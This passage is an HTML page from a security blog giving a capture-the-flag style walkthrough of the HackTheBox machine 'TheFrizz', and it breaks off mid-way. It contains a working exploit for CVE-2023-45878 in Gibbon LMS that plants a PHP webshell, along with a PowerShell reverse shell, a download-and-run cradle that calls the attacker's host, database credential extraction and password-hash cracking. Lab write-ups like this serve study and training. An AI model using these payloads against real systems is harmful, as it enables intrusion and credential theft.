@@ -1,0 +1,710 @@
+<!DOCTYPE html>
+<html lang="en" class="h-full">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width,initial-scale=1">
+    <meta name="turbo-cache-control" content="no-cache" data-turbo-track="reload" data-track-token="3.11.0.809280860992">
+
+    <!-- See retype.com -->
+    <meta name="generator" content="Retype 3.11.0">
+
+    <!-- Primary Meta Tags -->
+    <title>TheFrizz (Medium)</title>
+    <meta name="title" content="TheFrizz (Medium)">
+    <meta name="description" content="TheFrizz is a medium-difficulty Windows machine featuring a web application showcasing Walkerville Elementary School and a Gibbon CMS instance.">
+
+    <!-- Canonical -->
+    <link rel="canonical" href="https://bytebl33d.github.io/writeups/hackthebox/machines/thefrizz/">
+
+    <!-- Open Graph / Facebook -->
+    <meta property="og:type" content="website">
+    <meta property="og:url" content="https://bytebl33d.github.io/writeups/hackthebox/machines/thefrizz/">
+    <meta property="og:title" content="TheFrizz (Medium)">
+    <meta property="og:description" content="TheFrizz is a medium-difficulty Windows machine featuring a web application showcasing Walkerville Elementary School and a Gibbon CMS instance.">
+    <meta property="og:image" content="https://bytebl33d.github.io/assets/images/headers/thefrizz.png">
+
+    <!-- Twitter -->
+    <meta property="twitter:card" content="summary_large_image">
+    <meta property="twitter:url" content="https://bytebl33d.github.io/writeups/hackthebox/machines/thefrizz/">
+    <meta property="twitter:title" content="TheFrizz (Medium)">
+    <meta property="twitter:description" content="TheFrizz is a medium-difficulty Windows machine featuring a web application showcasing Walkerville Elementary School and a Gibbon CMS instance.">
+    <meta property="twitter:image" content="https://bytebl33d.github.io/assets/images/headers/thefrizz.png">
+
+    <script data-cfasync="false">(function(){var cl=document.documentElement.classList,ls=localStorage.getItem("retype_scheme"),hd=cl.contains("dark"),hl=cl.contains("light"),wm=window.matchMedia&&window.matchMedia("(prefers-color-scheme: dark)").matches;if(ls==="dark"||(!ls&&wm&&!hd&&!hl)){cl.remove("light");cl.add("dark")}else if(ls==="light"||(!ls&&!wm&&!hd&&!hl)){cl.remove("dark");cl.add("light")}})();</script>
+
+    <link href="../../../../resources/css/retype.css?v=3.11.0.809280860992" rel="stylesheet">
+
+    <script data-cfasync="false" src="../../../../resources/js/config.js?v=3.11.0.809280860992" data-turbo-eval="false" defer></script>
+    <script data-cfasync="false" src="../../../../resources/js/retype.js?v=3.11.0" data-turbo-eval="false" defer></script>
+    <script id="lunr-js" data-cfasync="false" src="../../../../resources/js/lunr.js?v=3.11.0.809280860992" data-turbo-eval="false" defer></script>
+    <script id="prism-js" data-cfasync="false" src="../../../../resources/js/prism.js?v=3.11.0.809280860992" defer></script>
+</head>
+<body>
+    <div id="retype-app" class="relative text-base antialiased text-base-text bg-base-bg font-body">
+        <div class="absolute bottom-0 left-0" style="top: 5rem; right: 50%"></div>
+    
+        <header id="retype-header" class="sticky top-0 z-30 flex w-full h-16 bg-header-bg border-b border-header-border md:h-20">
+            <div class="container relative flex items-center justify-between pr-6 grow md:justify-start">
+                <!-- Mobile menu button skeleton -->
+                <button v-cloak class="skeleton retype-mobile-menu-button flex items-center justify-center shrink-0 overflow-hidden dark:text-white focus:outline-none rounded-full w-10 h-10 ml-3.5 md:hidden"><svg xmlns="http://www.w3.org/2000/svg" class="mb-px shrink-0" width="24" height="24" viewBox="0 0 24 24" role="presentation" style="margin-bottom: 0px;"><g fill="currentColor"><path d="M2 4h20v2H2zM2 11h20v2H2zM2 18h20v2H2z"></path></g></svg></button>
+                <div v-cloak id="retype-sidebar-left-toggle-button"></div>
+        
+                <!-- Logo -->
+                <div class="flex items-center justify-between h-full py-2 md:w-75">
+                    <div class="flex items-center px-2 md:px-6">
+                        <a id="retype-branding-logo" href="../../../../" class="flex items-center leading-snug text-2xl">
+                            <span class="dark:text-white font-bold line-clamp-1 md:line-clamp-2">bytebl33d</span>
+                        </a><span id="retype-branding-label" class="inline-flex mt-1 px-2 py-1 ml-4 text-xs font-medium leading-none items-center rounded-md bg-branding-label-bg text-branding-label-text ring-1 ring-branding-label-border ring-inset md:inline-block">Blog</span>
+                    </div>
+        
+                    <span class="hidden h-8 border-r md:inline-block border-base-border"></span>
+                </div>
+        
+                <div class="flex justify-between md:grow">
+                    <!-- Top Nav -->
+                    <nav id="retype-header-nav" class="hidden md:flex">
+                        <ul class="flex flex-col mb-4 md:pl-16 md:mb-0 md:flex-row md:items-center">
+                            <li class="mr-6">
+                                <a class="py-2 md:mb-0 inline-flex items-center text-sm whitespace-nowrap transition-colors duration-200 ease-linear md:text-header-text font-header-text-weight hover:text-header-text-hover" href="../../../../blog/">Posts</a>
+                            </li>
+                            <li class="mr-6">
+                                <a class="py-2 md:mb-0 inline-flex items-center text-sm whitespace-nowrap transition-colors duration-200 ease-linear md:text-header-text font-header-text-weight hover:text-header-text-hover" href="https://github.com/bytebl33d">GitHub</a>
+                            </li>
+        
+                        </ul>
+                    </nav>
+        
+                    <!-- Header Right Skeleton -->
+                    <div v-cloak class="flex justify-end grow skeleton">
+        
+                        <!-- Search input mock -->
+                        <div class="relative hidden w-40 lg:block lg:max-w-sm lg:ml-auto">
+                            <div class="absolute flex items-center justify-center h-full pl-3 dark:text-dark-300">
+                                <svg xmlns="http://www.w3.org/2000/svg" class="icon-base" width="16" height="16" viewBox="0 0 24 24" aria-labelledby="icon" role="presentation" style="margin-bottom: 1px;"><g fill="currentColor" ><path d="M21.71 20.29l-3.68-3.68A8.963 8.963 0 0020 11c0-4.96-4.04-9-9-9s-9 4.04-9 9 4.04 9 9 9c2.12 0 4.07-.74 5.61-1.97l3.68 3.68c.2.19.45.29.71.29s.51-.1.71-.29c.39-.39.39-1.03 0-1.42zM4 11c0-3.86 3.14-7 7-7s7 3.14 7 7c0 1.92-.78 3.66-2.04 4.93-.01.01-.02.01-.02.01-.01.01-.01.01-.01.02A6.98 6.98 0 0111 18c-3.86 0-7-3.14-7-7z" ></path></g></svg>
+                            </div>
+                            <input class="w-full h-10 placeholder-search-placeholder transition-colors duration-200 ease-in bg-search-bg border border-transparent rounded md:text-sm hover:border-search-border-hover focus:outline-none focus:border-search-border-focus" style="padding: 0.625rem 0.75rem 0.625rem 2rem" type="text" placeholder="Search">
+                        </div>
+        
+                        <!-- Mobile search button -->
+                        <div class="flex items-center justify-center w-10 h-10 lg:hidden">
+                            <svg xmlns="http://www.w3.org/2000/svg" class="shrink-0 icon-base" width="20" height="20" viewBox="0 0 24 24" aria-labelledby="icon" role="presentation" style="margin-bottom: 0px;"><g fill="currentColor" ><path d="M21.71 20.29l-3.68-3.68A8.963 8.963 0 0020 11c0-4.96-4.04-9-9-9s-9 4.04-9 9 4.04 9 9 9c2.12 0 4.07-.74 5.61-1.97l3.68 3.68c.2.19.45.29.71.29s.51-.1.71-.29c.39-.39.39-1.03 0-1.42zM4 11c0-3.86 3.14-7 7-7s7 3.14 7 7c0 1.92-.78 3.66-2.04 4.93-.01.01-.02.01-.02.01-.01.01-.01.01-.01.02A6.98 6.98 0 0111 18c-3.86 0-7-3.14-7-7z" ></path></g></svg>
+                        </div>
+        
+                        <!-- Dark mode switch placeholder -->
+                        <div class="w-10 h-10 lg:ml-2"></div>
+        
+                        <!-- History button -->
+                        <div class="flex items-center justify-center w-10 h-10" style="margin-right: -0.625rem;">
+                            <svg xmlns="http://www.w3.org/2000/svg" class="shrink-0 icon-base" width="22" height="22" viewBox="0 0 24 24" aria-labelledby="icon" role="presentation" style="margin-bottom: 0px;"><g fill="currentColor" ><g ><path d="M12.01 6.01c-.55 0-1 .45-1 1V12a1 1 0 00.4.8l3 2.22a.985.985 0 001.39-.2.996.996 0 00-.21-1.4l-2.6-1.92V7.01c.02-.55-.43-1-.98-1z"></path><path d="M12.01 1.91c-5.33 0-9.69 4.16-10.05 9.4l-.29-.26a.997.997 0 10-1.34 1.48l1.97 1.79c.19.17.43.26.67.26s.48-.09.67-.26l1.97-1.79a.997.997 0 10-1.34-1.48l-.31.28c.34-4.14 3.82-7.41 8.05-7.41 4.46 0 8.08 3.63 8.08 8.09s-3.63 8.08-8.08 8.08c-2.18 0-4.22-.85-5.75-2.4a.996.996 0 10-1.42 1.4 10.02 10.02 0 007.17 2.99c5.56 0 10.08-4.52 10.08-10.08.01-5.56-4.52-10.09-10.08-10.09z"></path></g></g></svg>
+                        </div>
+                    </div>
+        
+                    <div v-cloak class="flex justify-end grow">
+                        <div id="retype-mobile-search-button"></div>
+                        <doc-search-desktop></doc-search-desktop>
+        
+                        <doc-theme-switch class="lg:ml-2"></doc-theme-switch>
+                        <doc-history></doc-history>
+                    </div>
+                </div>
+            </div>
+        </header>
+    
+    
+        <div id="retype-container" class="container relative flex bg-white">
+            <!-- Sidebar Skeleton -->
+            <div v-cloak class="fixed flex flex-col shrink-0 duration-300 ease-in-out bg-sidebar-left-bg border-sidebar-left-border sidebar top-20 w-75 border-r h-screen md:sticky transition-transform skeleton">
+            
+                <div class="flex items-center h-16 px-6">
+                    <input class="w-full h-8 px-3 py-2 transition-colors duration-200 ease-linear bg-filter-bg border border-filter-border rounded shadow-none text-sm focus:outline-none focus:border-filter-border-focus" type="text" placeholder="Filter">
+                </div>
+            
+                <div class="pl-6 mt-1 mb-4">
+                    <div class="w-32 h-3 mb-4 bg-skeleton-bg rounded-full loading"></div>
+                    <div class="w-48 h-3 mb-4 bg-skeleton-bg rounded-full loading"></div>
+                    <div class="w-40 h-3 mb-4 bg-skeleton-bg rounded-full loading"></div>
+                    <div class="w-32 h-3 mb-4 bg-skeleton-bg rounded-full loading"></div>
+                    <div class="w-48 h-3 mb-4 bg-skeleton-bg rounded-full loading"></div>
+                    <div class="w-40 h-3 mb-4 bg-skeleton-bg rounded-full loading"></div>
+                </div>
+            
+                <div class="shrink-0 mt-auto bg-transparent dark:border-base-border">
+                    <a class="flex items-center justify-center flex-nowrap h-16 text-gray-350 dark:text-dark-400 hover:text-gray-600 dark:hover:text-dark-300 transition-colors duration-150 ease-in docs-powered-by" target="_blank" href="https://retype.com/" rel="noopener">
+                        <span class="text-xs whitespace-nowrap">Powered by</span>
+                        <svg xmlns="http://www.w3.org/2000/svg" class="ml-2" fill="currentColor" width="96" height="20" overflow="visible"><path d="M0 0v20h13.59V0H0zm11.15 17.54H2.44V2.46h8.71v15.08zM15.8 20h2.44V4.67L15.8 2.22zM20.45 6.89V20h2.44V9.34z"/><g><path d="M40.16 8.44c0 1.49-.59 2.45-1.75 2.88l2.34 3.32h-2.53l-2.04-2.96h-1.43v2.96h-2.06V5.36h3.5c1.43 0 2.46.24 3.07.73s.9 1.27.9 2.35zm-2.48 1.1c.26-.23.38-.59.38-1.09 0-.5-.13-.84-.4-1.03s-.73-.28-1.39-.28h-1.54v2.75h1.5c.72 0 1.2-.12 1.45-.35zM51.56 5.36V7.2h-4.59v1.91h4.13v1.76h-4.13v1.92h4.74v1.83h-6.79V5.36h6.64zM60.09 7.15v7.48h-2.06V7.15h-2.61V5.36h7.28v1.79h-2.61zM70.81 14.64h-2.06v-3.66l-3.19-5.61h2.23l1.99 3.45 1.99-3.45H74l-3.19 5.61v3.66zM83.99 6.19c.65.55.97 1.4.97 2.55s-.33 1.98-1 2.51-1.68.8-3.04.8h-1.23v2.59h-2.06V5.36h3.26c1.42 0 2.45.28 3.1.83zm-1.51 3.65c.25-.28.37-.69.37-1.22s-.16-.92-.48-1.14c-.32-.23-.82-.34-1.5-.34H79.7v3.12h1.38c.68 0 1.15-.14 1.4-.42zM95.85 5.36V7.2h-4.59v1.91h4.13v1.76h-4.13v1.92H96v1.83h-6.79V5.36h6.64z"/></g></svg>
+                    </a>
+                </div>
+            </div>
+            
+            <!-- Sidebar component -->
+            <doc-sidebar v-cloak>
+                <template #sidebar-footer>
+                    <div class="shrink-0 mt-auto border-t md:bg-transparent md:border-none dark:border-base-border">
+            
+                        <div class="py-3 px-6 md:hidden border-b dark:border-base-border">
+                            <nav>
+                                <ul class="flex flex-wrap justify-center items-center">
+                                    <li class="mr-6">
+                                        <a class="block py-1 inline-flex items-center text-sm whitespace-nowrap transition-colors duration-200 ease-linear md:text-header-text font-header-text-weight hover:text-header-text-hover" href="../../../../blog/">Posts</a>
+                                    </li>
+                                    <li class="mr-6">
+                                        <a class="block py-1 inline-flex items-center text-sm whitespace-nowrap transition-colors duration-200 ease-linear md:text-header-text font-header-text-weight hover:text-header-text-hover" href="https://github.com/bytebl33d">GitHub</a>
+                                    </li>
+            
+                                </ul>
+                            </nav>
+                        </div>
+            
+                        <a class="flex items-center justify-center flex-nowrap h-16 text-gray-350 dark:text-dark-400 hover:text-gray-600 dark:hover:text-dark-300 transition-colors duration-150 ease-in docs-powered-by" target="_blank" href="https://retype.com/" rel="noopener">
+                            <span class="text-xs whitespace-nowrap">Powered by</span>
+                            <svg xmlns="http://www.w3.org/2000/svg" class="ml-2" fill="currentColor" width="96" height="20" overflow="visible"><path d="M0 0v20h13.59V0H0zm11.15 17.54H2.44V2.46h8.71v15.08zM15.8 20h2.44V4.67L15.8 2.22zM20.45 6.89V20h2.44V9.34z"/><g><path d="M40.16 8.44c0 1.49-.59 2.45-1.75 2.88l2.34 3.32h-2.53l-2.04-2.96h-1.43v2.96h-2.06V5.36h3.5c1.43 0 2.46.24 3.07.73s.9 1.27.9 2.35zm-2.48 1.1c.26-.23.38-.59.38-1.09 0-.5-.13-.84-.4-1.03s-.73-.28-1.39-.28h-1.54v2.75h1.5c.72 0 1.2-.12 1.45-.35zM51.56 5.36V7.2h-4.59v1.91h4.13v1.76h-4.13v1.92h4.74v1.83h-6.79V5.36h6.64zM60.09 7.15v7.48h-2.06V7.15h-2.61V5.36h7.28v1.79h-2.61zM70.81 14.64h-2.06v-3.66l-3.19-5.61h2.23l1.99 3.45 1.99-3.45H74l-3.19 5.61v3.66zM83.99 6.19c.65.55.97 1.4.97 2.55s-.33 1.98-1 2.51-1.68.8-3.04.8h-1.23v2.59h-2.06V5.36h3.26c1.42 0 2.45.28 3.1.83zm-1.51 3.65c.25-.28.37-.69.37-1.22s-.16-.92-.48-1.14c-.32-.23-.82-.34-1.5-.34H79.7v3.12h1.38c.68 0 1.15-.14 1.4-.42zM95.85 5.36V7.2h-4.59v1.91h4.13v1.76h-4.13v1.92H96v1.83h-6.79V5.36h6.64z"/></g></svg>
+                        </a>
+                    </div>
+                </template>
+            </doc-sidebar>
+    
+            <div class="grow min-w-0 bg-body-bg">
+                <!-- Render "toolbar" template here on api pages --><!-- Render page content -->
+                <div class="flex">
+                    <div id="retype-main" class="min-w-0 p-4 grow md:px-16">
+                        <main class="relative pb-12 lg:pt-2">
+                            <div class="retype-markdown" id="retype-content">
+                                <!-- Rendered if sidebar right is enabled -->
+                                <div id="retype-sidebar-right-toggle"></div>
+                                <!-- Page content  -->
+<doc-anchor-target id="thefrizz-medium" class="break-words">
+    <h1>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#thefrizz-medium">#</doc-anchor-trigger>
+        <span>TheFrizz (Medium)</span>
+    </h1>
+</doc-anchor-target>
+<div class="-mt-3 mb-12 flex flex-wrap text-sm text-gray-400 dark:text-dark-350 items-center print:justify-center">
+    <div>In&nbsp;</div>
+    <div><a href="../../../../categories/hackthebox/">HackTheBox</a>,&nbsp;</div>
+    <div><a href="../../../../categories/windows/">Windows</a>,&nbsp;</div>
+    <div><a href="../../../../categories/active-directory/">Active-Directory</a></div>
+    <div class="mx-2">&#9679;</div>
+    <div class="flex items-center shrink-0">Published&nbsp;<span>2025-08-23</span></div>
+</div>
+
+<p><figure class="content-center">
+    <img src="../../../../assets/images/headers/thefrizz.png" alt="" class="rounded-image-rounded border-image-border border-image-border-width" />
+    <figcaption class="caption"></figcaption>
+</figure>
+</p>
+<doc-anchor-target id="synopsis" class="break-words">
+    <h1>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#synopsis">#</doc-anchor-trigger>
+        <span>Synopsis</span>
+    </h1>
+</doc-anchor-target>
+<p><code v-pre>TheFrizz</code> is a medium-difficulty Windows machine featuring a web application showcasing Walkerville Elementary School and a Gibbon CMS instance. The Gibbon-LMS instance is susceptible to unauthenticated arbitrary file write (CVE-2023-45878), which is used to write a PHP shell to the web application and gain access to the target. After gaining access to the system, a database settings file containing credentials to access MySQL includes a hash and salt for the user f.frizzle that can be cracked. After cracking the password, we authenticate to the target using SSH with GSSAPI/Kerberos. We request a TGT, which is then used to authenticate via Kerberos authentication. A deleted 7Zip archive is discovered in the <code v-pre>fiona</code> user&#x27;s recycling bin which is extracted revealing a WAPT setup and includes a configuration file with base64-encoded credentials used to authenticate as the <code v-pre>M.Schoolbus</code> user. <code v-pre>M.Schoolbus</code> is a member of the <code v-pre>Group Policy Creator Owners</code>, which allows them to create GPOs within the domain, which is leveraged to escalate privileges to <code v-pre>NT Authority\System</code>.</p>
+<doc-anchor-target id="enumeration">
+    <h2>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#enumeration">#</doc-anchor-trigger>
+        <span>Enumeration</span>
+    </h2>
+</doc-anchor-target>
+<p>Our Nmap scan shows a Domain Controller with hostname <code v-pre>frizzdc.frizz.htb</code> hosting a web application on port 80.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre translate="no" class="language-shell-session"><code v-pre class="language-shell-session">$ nmap 10.129.26.253 -sCV -v -oN thefrizz.nmap 
+Nmap scan report for 10.129.26.253
+Host is up (0.030s latency).
+Not shown: 987 filtered tcp ports (no-response)
+PORT     STATE SERVICE       VERSION
+22/tcp   open  ssh           OpenSSH for_Windows_9.5 (protocol 2.0)
+53/tcp   open  domain        Simple DNS Plus
+80/tcp   open  http          Apache httpd 2.4.58 (OpenSSL/3.1.3 PHP/8.2.12)
+|_http-server-header: Apache/2.4.58 (Win64) OpenSSL/3.1.3 PHP/8.2.12
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-title: Did not follow redirect to http://frizzdc.frizz.htb/home/
+88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-03-16 02:56:36Z)
+135/tcp  open  msrpc         Microsoft Windows RPC
+139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: frizz.htb0., Site: Default-First-Site-Name)
+445/tcp  open  microsoft-ds?
+464/tcp  open  kpasswd5?
+593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+636/tcp  open  tcpwrapped
+3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: frizz.htb0., Site: Default-First-Site-Name)
+3269/tcp open  tcpwrapped
+Service Info: Hosts: localhost, FRIZZDC; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| smb2-time: 
+|   date: 2025-03-16T02:56:39
+|_  start_date: N/A
+|_clock-skew: 6h59m59s
+| smb2-security-mode: 
+|   3:1:1: 
+|_    Message signing enabled and required</code></pre>
+</doc-codeblock></div>
+<p>After navigating the site, we can navigate to the staff login at <code v-pre>http://frizzdc.frizz.htb/Gibbon-LMS/</code>.</p>
+<p><figure class="content-center">
+    <img src="../../../../assets/images/writeups/thefrizz/staff-login.png" alt="" class="rounded-image-rounded border-image-border border-image-border-width" />
+    <figcaption class="caption"></figcaption>
+</figure>
+</p>
+<p>In the footer, we see the site is <code v-pre>Powered by Gibbon v25.0.00</code> and find a welcome message at the top.</p>
+<p><figure class="content-center">
+    <img src="../../../../assets/images/writeups/thefrizz/staff-login2.png" alt="" class="rounded-image-rounded border-image-border border-image-border-width" />
+    <figcaption class="caption"></figcaption>
+</figure>
+</p>
+<p>We have a potential user (Fiona Frizzle) that we can expect on the target machine. We can Google for available exploits that target this specific version. There are several vulnerabilities in version 26.0.00 and below like an LFI in the query parameter (CVE-2023-34598) and an authenticated RCE (<a href="hhttps://www.exploit-db.com/exploits/51903">CVE-2024-24725</a>). However, we don&#x27;t have any credentials yet, so we start looking further.</p>
+<p>On <a href="https://vulmon.com/searchpage?q=Gibbonedu%20Gibbon">Vulmon</a>, we can find a critical vulnerability in GibbonEdu allowing arbitrary file write (CVE-2023-45878) in the <em>Rubrics</em> module.</p>
+<p><figure class="content-center">
+    <img src="../../../../assets/images/writeups/thefrizz/gibbon-exploit-research.png" alt="" class="rounded-image-rounded border-image-border border-image-border-width" />
+    <figcaption class="caption"></figcaption>
+</figure>
+</p>
+<p>The description and PoC on <a href="https://herolab.usd.de/security-advisories/usd-2023-0025/">HeroLab</a> explains that this module has a file called <code v-pre>rubrics_visualise_saveAjax.php</code> which can be accessed without authentication. Therefore, we first verify if we can access this file.</p>
+<p><figure class="content-center">
+    <img src="../../../../assets/images/writeups/thefrizz/rubrics-module.png" alt="" class="rounded-image-rounded border-image-border border-image-border-width" />
+    <figcaption class="caption"></figcaption>
+</figure>
+</p>
+<doc-anchor-target id="foothold">
+    <h2>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#foothold">#</doc-anchor-trigger>
+        <span>Foothold</span>
+    </h2>
+</doc-anchor-target>
+<p>We verified that the script is indeed active on our instance. Reading the article, it explains that the file accepts the <code v-pre>img</code>, <code v-pre>path</code> and <code v-pre>gibbonPersonID</code> as POST parameters. If the <code v-pre>path</code> parameter is set, the defined path is used as the destination folder, concatinated with the absolute path of the Gibbon installation directory. We can create a small exploit script that writes a PHP file in the installation directory.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre translate="no" class="language-python"><code v-pre class="language-python">import requests
+import base64
+
+# config options
+gibbon_root = &quot;http://frizzdc.frizz.htb/Gibbon-LMS/&quot;
+path = &quot;asdf.php&quot;
+payload = &quot;&lt;?php echo system($_GET['cmd']);?&gt;&quot;
+
+url = f&quot;{gibbon_root}/modules/Rubrics/rubrics_visualise_saveAjax.php&quot;
+target_file = f&quot;{gibbon_root.rsplit('/', 1)[0]}/{path}&quot;
+encoded_payload = base64.b64encode(payload.encode()).decode()
+
+data = {
+  &quot;img&quot; : f&quot;image/png;asdf,{encoded_payload}&quot;,
+  &quot;path&quot;: path,
+  &quot;gibbonPersonID&quot;: &quot;0000000001&quot;
+}
+
+response = requests.post(url,data=data)
+
+if response.status_code == 200:
+  print(f&quot;[+] Payload sent successfully to {url}&quot;)
+  if requests.get(target_file).status_code == 200:
+  	print(f&quot;[+] File accessible at {target_file}&quot;)
+  	print(f&quot;[+] Checking current user: {requests.get(f'{target_file}?cmd=whoami').text}&quot;)
+  else:
+  	print(f&quot;[-] Could not access file at {target_file}&quot;)
+else:
+  print(f&quot;[!] Failed to send payload. Status code: {response.status_code}&quot;)</code></pre>
+</doc-codeblock></div>
+<p>After running our exploit script we can access our webshell.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre translate="no" class="language-shell-session"><code v-pre class="language-shell-session">$ python exploit.py
+[+] Payload sent successfully to http://frizzdc.frizz.htb/Gibbon-LMS//modules/Rubrics/rubrics_visualise_saveAjax.php
+[+] File accessible at http://frizzdc.frizz.htb/Gibbon-LMS/asdf.php
+[+] Checking current user: frizz\w.webservice</code></pre>
+</doc-codeblock></div>
+<p>Next we can try to get a shell on the machine. We can generate a Powershell reverse shell cradle as follows:</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre translate="no" class="language-shell-session"><code v-pre class="language-shell-session">$ cat shell.ps1
+$client = New-Object System.Net.Sockets.TCPClient('10.10.16.29',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '&gt; ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
+
+$ echo &quot;IEX (New-Object System.Net.WebClient).DownloadString('http://10.10.16.29:8888/shell.ps1')&quot; &gt; cradle
+$ cat cradle | iconv -t utf-16le | base64 -w 0; echo
+
+$ python3 -m http.server 8888
+$ sudo nc -nvlp 443
+$ curl 'http://frizzdc.frizz.htb/Gibbon-LMS/asdf.php?cmd=cmd+/c+powershell+-enc+SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAEQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADAALgAxADAALgAxADYALgAyADkAOgA4ADgAOAA4AC8AcwBoAGUAbABsAC4AcABzADEAJwApAAoA'</code></pre>
+</doc-codeblock></div>
+<p>After running our Python server and Netcat listener, we can launch our command to get a shell as <code v-pre>frizz\w.webservice</code>.</p>
+<p><figure class="content-center">
+    <img src="../../../../assets/images/writeups/thefrizz/foothold-shell.png" alt="" class="rounded-image-rounded border-image-border border-image-border-width" />
+    <figcaption class="caption"></figcaption>
+</figure>
+</p>
+<doc-anchor-target id="user">
+    <h2>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#user">#</doc-anchor-trigger>
+        <span>User</span>
+    </h2>
+</doc-anchor-target>
+<p>After having a shell on the box, we proceed to do further host enumeration. I looked for interesting files in the current directory and looking for patterns that matched the keywords &quot;password&quot;, &quot;database&quot; or &quot;htb&quot;.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre translate="no" class="language-shell-session"><code v-pre class="language-shell-session">PS C:\xampp\htdocs\Gibbon-LMS&gt; Get-ChildItem -File -Recurse -Depth 1 | Where-Object{$_.FullName -match 'config|database|setting'} | Select-String -Pattern &quot;(?i)password|database|htb&quot; | Select Filename,Line | Where-Object { $_.Line -notmatch &quot;^\s*[#*/]&quot; }
+
+Filename   Line
+--------   ----
+config.php $databaseServer = 'localhost';
+config.php $databaseUsername = 'MrGibbonsDB';
+config.php $databasePassword = 'MisterGibbs!Parrot!?1';
+config.php $databaseName = 'gibbon';</code></pre>
+</doc-codeblock></div>
+<p>After running this command it finds a <code v-pre>config.php</code> that contains the password of the Gibbon database. Next we can run <code v-pre>mysql</code> to extract data from the database. Note that we have to be in the current directory to execute the binary.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre translate="no" class="language-shell-session"><code v-pre class="language-shell-session">PS C:\xampp\mysql\bin\&gt; .\mysql.exe -u MrGibbonsDB -p&quot;MisterGibbs!Parrot!?1&quot; -e &quot;USE gibbon;DESCRIBE gibbonperson;&quot;
+&lt;SNIP&gt;
+nameInCharacters        varchar(60)     NO              NULL
+gender  enum('M','F','Other','Unspecified')     NO              Unspecified
+username        varchar(20)     NO      UNI     NULL
+passwordStrong  varchar(255)    NO              NULL
+passwordStrongSalt      varchar(255)    NO              NULL
+passwordForceReset      enum('N','Y')   NO              N
+&lt;SNIP&gt;
+
+PS C:\xampp\mysql\bin\&gt; .\mysql.exe -u MrGibbonsDB -p&quot;MisterGibbs!Parrot!?1&quot; -e &quot;USE gibbon;SELECT username,passwordStrong,passwordStrongSalt from gibbonperson;&quot;
+username        passwordStrong  passwordStrongSalt
+f.frizzle       067f746faca44f170c6cd9d7c4bdac6bc342c608687733f80ff784242b0b0c03        /aACFhikmNopqrRTVz2489</code></pre>
+</doc-codeblock></div>
+<p>Inside the database we can find a password hash and salt for <code v-pre>f.frizzle</code>. We can conver the hash into the right format and crack it with Hashcat.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre translate="no" class="language-shell-session"><code v-pre class="language-shell-session">$ hashcat '067f746faca44f170c6cd9d7c4bdac6bc342c608687733f80ff784242b0b0c03:/aACFhikmNopqrRTVz2489' $ROCKYOU -m 1420
+
+067f746faca44f170c6cd9d7c4bdac6bc342c608687733f80ff784242b0b0c03:/aACFhikmNopqrRTVz2489:Jenni_Luvs_Magic23</code></pre>
+</doc-codeblock></div>
+<p>We were able to crack the password of Fiona Frizzle. The password allows us to login to the Gibbon backend.</p>
+<p><figure class="content-center">
+    <img src="../../../../assets/images/writeups/thefrizz/gibbon-backend.png" alt="" class="rounded-image-rounded border-image-border border-image-border-width" />
+    <figcaption class="caption"></figcaption>
+</figure>
+</p>
+<p>On the message wall, Fiona is talking about a desktop management tool called WAPT so we can keep that in the back of our head. For now we can try to login using SMB or WinRM.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre translate="no" class="language-shell-session"><code v-pre class="language-shell-session">$ nxc smb frizz.htb -u 'f.frizzle' -p 'Jenni_Luvs_Magic23' -d frizz.htb
+SMB         10.129.48.142   445    10.129.48.142    [*]  x64 (name:10.129.48.142) (domain:10.129.48.142) (signing:True) (SMBv1:False)
+SMB         10.129.48.142   445    10.129.48.142    [-] frizz.htb\f.frizzle:Jenni_Luvs_Magic23 STATUS_NOT_SUPPORTED</code></pre>
+</doc-codeblock></div>
+<p>However, we get a <code v-pre>STATUS_NOT_SUPPORTED</code> error. Lets try to get a TGT and try again with Kerberos.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre translate="no" class="language-shell-session"><code v-pre class="language-shell-session">$ getTGT.py frizz.htb/f.frizzle:Jenni_Luvs_Magic23
+Impacket v0.13.0.dev0+20250206.100953.075f2b10 - Copyright Fortra, LLC and its affiliated companies
+
+Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)</code></pre>
+</doc-codeblock></div>
+<p>We can easily fix the clock skew with <code v-pre>faketime</code>:</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre translate="no" class="language-shell-session"><code v-pre class="language-shell-session">$ faketime &quot;$(ntpdate -q frizz.htb | cut -d ' ' -f 1,2)&quot; bash
+$ getTGT.py frizz.htb/f.frizzle:Jenni_Luvs_Magic23
+$ nxc smb frizz.htb -k -d frizz.htb --use-kcache
